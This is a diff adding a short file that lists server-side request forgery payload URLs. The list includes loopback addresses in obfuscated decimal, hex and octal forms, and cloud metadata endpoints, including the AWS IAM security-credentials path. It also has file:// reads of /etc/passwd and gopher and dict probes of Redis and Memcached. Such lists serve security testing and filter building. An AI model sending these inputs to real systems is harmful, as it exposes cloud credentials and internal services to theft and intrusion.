@@ -1,0 +1,17 @@
+http://127.0.0.1/
+http://localhost/
+http://[::1]/
+http://0.0.0.0/
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1beta1/instance/?recursive=true
+http://100.100.100.200/latest/meta-data/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://2130706433/
+http://0x7f.0x0.0x0.0x1/
+http://0177.0.0.1/
+file:///etc/passwd
+file:///etc/hostname
+gopher://127.0.0.1:6379/_INFO
+dict://127.0.0.1:11211/stats
